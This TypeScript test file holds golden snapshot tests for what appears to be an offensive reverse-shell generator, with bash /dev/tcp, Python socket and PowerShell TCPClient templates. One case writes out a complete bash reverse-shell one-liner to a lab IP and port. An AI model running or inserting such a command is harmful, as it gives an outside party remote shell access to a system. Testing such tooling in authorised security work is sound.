import { describe, expect, it } from "vitest";
import { generateReverseShell } from "./generate";

const goldenCases = [
  {
    templateId: "bash-dev-tcp",
    lhost: "10.10.14.3",
    lport: 4444,
    shell: "/bin/bash",
    expected: `/bin/bash -i >& /dev/tcp/10.10.14.3/4444 0>&1`,
  },
  {
    templateId: "python3-socket",
    lhost: "10.0.0.5",
    lport: 9001,
    shell: "/bin/bash",
    expectedIncludes: ["python3 -c", "10.0.0.5", "9001"],
  },
  {
    templateId: "powershell-tcp-client",
    lhost: "10.10.14.3",
    lport: 4444,
    shell: "powershell.exe",
    expectedIncludes: ["TCPClient", "10.10.14.3", "4444"],
  },
] as const;

describe("command golden snapshots", () => {
  for (const testCase of goldenCases) {
    it(`renders ${testCase.templateId}`, () => {
      const generated = generateReverseShell({
        templateId: testCase.templateId,
        lhost: testCase.lhost,
        lport: testCase.lport,
        shell: testCase.shell,
        obfuscation: "none",
      });

      if ("expected" in testCase) {
        expect(generated.command).toBe(testCase.expected);
      } else {
        for (const fragment of testCase.expectedIncludes) {
          expect(generated.command).toContain(fragment);
        }
      }
    });
  }
});
